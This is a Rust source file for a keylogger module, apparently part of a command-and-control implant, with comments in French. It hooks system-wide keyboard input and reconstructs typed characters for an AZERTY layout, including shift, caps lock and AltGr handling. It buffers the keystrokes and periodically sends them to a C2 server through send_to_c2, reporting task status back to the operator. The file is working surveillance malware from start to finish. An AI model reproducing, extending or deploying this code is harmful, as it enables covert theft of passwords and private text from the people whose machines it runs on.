use crate::connexion::{send_directive_status, send_to_c2};
use anyhow::Result;
use rdev::{Event, EventType, Key};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use tokio::time::{interval, Duration};

const MAX_BUFFER_SIZE: usize = 10_000;

lazy_static::lazy_static! {
    static ref GLOBAL_BUFFER: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    static ref MODIFIERS: Arc<Mutex<ModifierState>> = Arc::new(Mutex::new(ModifierState::default()));
    static ref SHOULD_RUN: AtomicBool = AtomicBool::new(false);
    static ref LISTENER_STARTED: AtomicBool = AtomicBool::new(false);
}

#[derive(Default, Debug)]
struct ModifierState {
    shift_pressed: bool,
    caps_lock_on: bool,
    ctrl_pressed: bool,
    alt_pressed: bool,
    backspace_pressed: bool,
}

struct KeyLogger {
    buffer: Arc<Mutex<Vec<String>>>,
}

impl KeyLogger {
    fn new() -> Self {
        Self {
            buffer: Arc::clone(&GLOBAL_BUFFER),
        }
    }

    async fn start(&self, send_interval: Duration) -> Result<()> {
        let mut send_interval = interval(send_interval);

        while SHOULD_RUN.load(Ordering::SeqCst) {
            send_interval.tick().await;

            if let Err(e) = self.send_buffer().await {
                eprintln!("Erreur lors de l'envoi: {}", e);
            }
        }

        self.send_buffer().await?;

        Ok(())
    }

    async fn send_buffer(&self) -> Result<()> {
        let data = {
            let mut buffer = self
                .buffer
                .lock()
                .map_err(|e| anyhow::anyhow!("Impossible de verrouiller le buffer: {}", e))?;

            if buffer.is_empty() {
                return Ok(());
            }

            let data = buffer.join("");
            buffer.clear();
            data
        };

        println!("Envoi de {} caractères", data.len());

        send_to_c2(data.into_bytes())
            .await
            .map_err(|e| anyhow::anyhow!("Erreur lors de l'envoi au C2: {}", e))?;

        Ok(())
    }
}

fn callback(event: Event) {
    if !SHOULD_RUN.load(Ordering::SeqCst) {
        return;
    }

    match event.event_type {
        EventType::KeyPress(key) => {
            let is_modifier = match key {
                Key::ShiftLeft | Key::ShiftRight => {
                    if let Ok(mut mods) = MODIFIERS.lock() {
                        mods.shift_pressed = true;
                    }
                    true
                }
                Key::ControlLeft | Key::ControlRight => {
                    if let Ok(mut mods) = MODIFIERS.lock() {
                        mods.ctrl_pressed = true;
                    }
                    true
                }
                Key::Alt | Key::AltGr => {
                    if let Ok(mut mods) = MODIFIERS.lock() {
                        mods.alt_pressed = true;
                    }
                    true
                }
                Key::CapsLock => {
                    if let Ok(mut mods) = MODIFIERS.lock() {
                        mods.caps_lock_on = !mods.caps_lock_on;
                    }
                    true
                }
                Key::Backspace => {
                    if let Ok(mut mods) = MODIFIERS.lock() {
                        if !mods.backspace_pressed {
                            mods.backspace_pressed = true;
                            if let Ok(mut buffer) = GLOBAL_BUFFER.lock() {
                                if buffer.len() < MAX_BUFFER_SIZE {
                                    buffer.push("[BACK]".to_string());
                                }
                            }
                        }
                    }
                    true
                }
                _ => false,
            };

            if !is_modifier {
                if let Some(key_char) = key_to_string_with_modifiers(key) {
                    if !key_char.is_empty() {
                        if let Ok(mut buffer) = GLOBAL_BUFFER.lock() {
                            if buffer.len() < MAX_BUFFER_SIZE {
                                buffer.push(key_char);
                            } else {
                                eprintln!("Buffer plein taille max: {}", MAX_BUFFER_SIZE);
                            }
                        }
                    }
                }
            }
        }
        EventType::KeyRelease(key) => match key {
            Key::ShiftLeft | Key::ShiftRight => {
                if let Ok(mut mods) = MODIFIERS.lock() {
                    mods.shift_pressed = false;
                }
            }
            Key::ControlLeft | Key::ControlRight => {
                if let Ok(mut mods) = MODIFIERS.lock() {
                    mods.ctrl_pressed = false;
                }
            }
            Key::Alt | Key::AltGr => {
                if let Ok(mut mods) = MODIFIERS.lock() {
                    mods.alt_pressed = false;
                }
            }
            Key::Backspace => {
                if let Ok(mut mods) = MODIFIERS.lock() {
                    mods.backspace_pressed = false;
                }
            }
            _ => {}
        },
        _ => {}
    }
}

fn key_to_string_with_modifiers(key: Key) -> Option<String> {
    let modifiers = MODIFIERS.lock().ok()?;

    Some(match key {
        Key::Return => "\n".to_string(),
        Key::Space => " ".to_string(),
        Key::Escape => "[ESC]".to_string(),
        Key::Tab => "[TAB]".to_string(),
        Key::Delete => "[DEL]".to_string(),
        Key::Home => "[HOME]".to_string(),
        Key::End => "[END]".to_string(),
        Key::PageUp => "[PGUP]".to_string(),
        Key::PageDown => "[PGDN]".to_string(),

        Key::CapsLock
        | Key::ShiftLeft
        | Key::ShiftRight
        | Key::ControlLeft
        | Key::ControlRight
        | Key::Alt => "".to_string(),

        Key::MetaLeft | Key::MetaRight => "[META]".to_string(),

        Key::UpArrow => "[UP]".to_string(),
        Key::DownArrow => "[DOWN]".to_string(),
        Key::LeftArrow => "[LEFT]".to_string(),
        Key::RightArrow => "[RIGHT]".to_string(),

        k @ (Key::KeyA
        | Key::KeyB
        | Key::KeyC
        | Key::KeyD
        | Key::KeyE
        | Key::KeyF
        | Key::KeyG
        | Key::KeyH
        | Key::KeyI
        | Key::KeyJ
        | Key::KeyK
        | Key::KeyL
        | Key::KeyM
        | Key::KeyN
        | Key::KeyO
        | Key::KeyP
        | Key::KeyQ
        | Key::KeyR
        | Key::KeyS
        | Key::KeyT
        | Key::KeyU
        | Key::KeyV
        | Key::KeyW
        | Key::KeyX
        | Key::KeyY
        | Key::KeyZ) => {
            let key_str = format!("{:?}", k);
            if let Some(letter_char) = key_str.chars().last() {
                get_letter_case(letter_char.to_ascii_lowercase(), &modifiers)
            } else {
                format!("[{:?}]", k)
            }
        }

        k @ (Key::Num0
        | Key::Num1
        | Key::Num2
        | Key::Num3
        | Key::Num4
        | Key::Num5
        | Key::Num6
        | Key::Num7
        | Key::Num8
        | Key::Num9
        | Key::Kp0
        | Key::Kp1
        | Key::Kp2
        | Key::Kp3
        | Key::Kp4
        | Key::Kp5
        | Key::Kp6
        | Key::Kp7
        | Key::Kp8
        | Key::Kp9) => get_number_or_symbol(k, modifiers.shift_pressed, modifiers.caps_lock_on, modifiers.alt_pressed),

        k @ (Key::Dot
        | Key::Comma
        | Key::SemiColon
        | Key::Quote
        | Key::BackSlash
        | Key::Slash
        | Key::KpDivide
        | Key::Minus
        | Key::KpMinus
        | Key::Equal
        | Key::LeftBracket
        | Key::RightBracket) => get_punctuation_or_symbol(k, modifiers.shift_pressed),

        Key::KpMultiply => "*".to_string(),
        Key::KpPlus => "+".to_string(),

        Key::F1 => "[F1]".to_string(),
        Key::F2 => "[F2]".to_string(),
        Key::F3 => "[F3]".to_string(),
        Key::F4 => "[F4]".to_string(),
        Key::F5 => "[F5]".to_string(),
        Key::F6 => "[F6]".to_string(),
        Key::F7 => "[F7]".to_string(),
        Key::F8 => "[F8]".to_string(),
        Key::F9 => "[F9]".to_string(),
        Key::F10 => "[F10]".to_string(),
        Key::F11 => "[F11]".to_string(),
        Key::F12 => "[F12]".to_string(),

        Key::PrintScreen => "[PRINT]".to_string(),
        Key::ScrollLock => "[SCROLL]".to_string(),
        Key::Pause => "[PAUSE]".to_string(),
        Key::Insert => "[INS]".to_string(),
        Key::NumLock => "[NUMLOCK]".to_string(),

        _ => format!("[{:?}]", key),
    })
}

fn get_letter_case(letter: char, modifiers: &ModifierState) -> String {
    let should_be_uppercase = modifiers.shift_pressed ^ modifiers.caps_lock_on;
    if should_be_uppercase {
        letter.to_uppercase().to_string()
    } else {
        letter.to_string()
    }
}

fn get_number_or_symbol(key: Key, shift: bool, caps_on: bool, alt_gr: bool) -> String {
    use Key::*;
    match key {
        Num1 => {
            if alt_gr {
                "".to_string()   
            } else if shift ^ caps_on {
                "1".to_string()
            } else {
                "&".to_string()
            }
        }
        Num2 => {
            if alt_gr {
                "~".to_string()
            } else if shift ^ caps_on {
                "2".to_string()
            } else {
                "é".to_string()
            }
        }
        Num3 => {
            if alt_gr {
                "#".to_string()
            } else if shift ^ caps_on {
                "3".to_string()
            } else {
                "\"".to_string()
            }
        }
        Num4 => {
            if alt_gr {
                "{".to_string()
            } else if shift ^ caps_on {
                "4".to_string()
            } else {
                "'".to_string()
            }
        }
        Num5 => {
            if alt_gr {
                "[".to_string()
            } else if shift ^ caps_on {
                "5".to_string()
            } else {
                "(".to_string()
            }
        }
        Num6 => {
            if alt_gr {
                "|".to_string()
            } else if shift ^ caps_on {
                "6".to_string()
            } else {
                "-".to_string()
            }
        }
        Num7 => {
            if alt_gr {
                "`".to_string()
            } else if shift ^ caps_on {
                "7".to_string()
            } else {
                "è".to_string()
            }
        }
        Num8 => {
            if alt_gr {
                "\\".to_string()
            } else if shift ^ caps_on {
                "8".to_string()
            } else {
                "_".to_string()
            }
        }
        Num9 => {
            if alt_gr {
                "^".to_string()
            } else if shift ^ caps_on {
                "9".to_string()
            } else {
                "ç".to_string()
            }
        }
        Num0 => {
            if alt_gr {
                "@".to_string()
            } else if shift ^ caps_on {
                "0".to_string()
            } else {
                "à".to_string()
            }
        }

        Kp0 => "0".to_string(),
        Kp1 => "1".to_string(),
        Kp2 => "2".to_string(),
        Kp3 => "3".to_string(),
        Kp4 => "4".to_string(),
        Kp5 => "5".to_string(),
        Kp6 => "6".to_string(),
        Kp7 => "7".to_string(),
        Kp8 => "8".to_string(),
        Kp9 => "9".to_string(),

        _ => "".to_string(),
    }
}

fn get_punctuation_or_symbol(key: Key, shift: bool) -> String {
    match (key, shift) {
        (Key::Dot, false) => ".".to_string(),
        (Key::Dot, true) => ">".to_string(),
        (Key::Comma, false) => ",".to_string(),
        (Key::Comma, true) => "<".to_string(),
        (Key::SemiColon, false) => ";".to_string(),
        (Key::SemiColon, true) => ":".to_string(),
        (Key::Quote, false) => "'".to_string(),
        (Key::Quote, true) => "\"".to_string(),
        (Key::BackSlash, false) => "\\".to_string(),
        (Key::BackSlash, true) => "|".to_string(),
        (Key::Slash, false) => "/".to_string(),
        (Key::Slash, true) => "?".to_string(),
        (Key::KpDivide, _) => "/".to_string(),
        (Key::Minus, false) => "-".to_string(),
        (Key::Minus, true) => "_".to_string(),
        (Key::KpMinus, _) => "-".to_string(),
        (Key::Equal, false) => "=".to_string(),
        (Key::Equal, true) => "+".to_string(),
        (Key::LeftBracket, false) => "[".to_string(),
        (Key::LeftBracket, true) => "{".to_string(),
        (Key::RightBracket, false) => "]".to_string(),
        (Key::RightBracket, true) => "}".to_string(),
        _ => "".to_string(),
    }
}

fn start_listener_once() {
    if !LISTENER_STARTED.load(Ordering::SeqCst) {
        LISTENER_STARTED.store(true, Ordering::SeqCst);
        thread::spawn(|| {
            if let Err(error) = rdev::listen(callback) {
                eprintln!("Erreur dans le listener rdev: {:?}", error);
            }
        });
    }
}

pub async fn start_keylogger(send_interval_sec: u64) -> Result<()> {
    if SHOULD_RUN.load(Ordering::SeqCst) {
        println!("[keylogger] Déjà en cours.");
        return Ok(());
    }

    SHOULD_RUN.store(true, Ordering::SeqCst);

    start_listener_once();

    let logger = KeyLogger::new();

    let handle =
        tokio::spawn(async move { logger.start(Duration::from_secs(send_interval_sec)).await });

    tokio::spawn(async move {
        match handle.await {
            Ok(Ok(())) => {
                let _ = send_directive_status("keylogger", "success", "Terminé").await;
            }
            Ok(Err(e)) => {
                let _ = send_directive_status("keylogger", "error", &e.to_string()).await;
            }
            Err(e) => {
                let _ = send_directive_status("keylogger", "error", &format!("Join error: {}", e))
                    .await;
            }
        }
    });

    Ok(())
}

pub fn stop_keylogger() {
    SHOULD_RUN.store(false, Ordering::SeqCst);
}
